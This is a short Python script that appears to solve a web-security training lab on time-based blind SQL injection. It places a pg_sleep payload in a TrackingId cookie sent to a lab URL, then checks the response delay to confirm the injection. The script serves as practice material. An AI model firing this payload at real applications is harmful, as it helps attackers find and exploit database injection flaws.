import requests
import time

url = "https://0ac300b20449e4898079441500a30095.web-security-academy.net/"
cookies = {
    "TrackingId": "Q0uylFqvzZYqiVEb'||pg_sleep(10)--",
    "session": "KiXecGjbMMQumRHgVXFVEKBOEfly82KY"
}

print("[*] Sending request with time‑delay payload...")
start = time.time()
try:
    requests.get(url, cookies=cookies, timeout=15)
except:
    pass
elapsed = time.time() - start

print(f"[+] Request completed in {elapsed:.2f} seconds")
if elapsed >= 9.0:
    print("Lab solved.")
else:
    print("No delay.")